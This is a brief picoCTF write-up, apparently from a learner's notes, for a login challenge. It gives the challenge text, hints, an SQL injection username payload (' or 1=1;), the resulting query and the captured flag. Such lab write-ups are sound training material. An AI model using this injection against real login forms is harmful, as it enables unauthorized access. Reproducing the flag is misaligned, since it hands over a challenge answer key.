# Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
# Pistas
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.
# Solución
```
username: ' or 1=1;
password: hola
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='hola'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
# Notas adicionales
# Referencias
- https://www.w3schools.com/sql/sql_injection.asp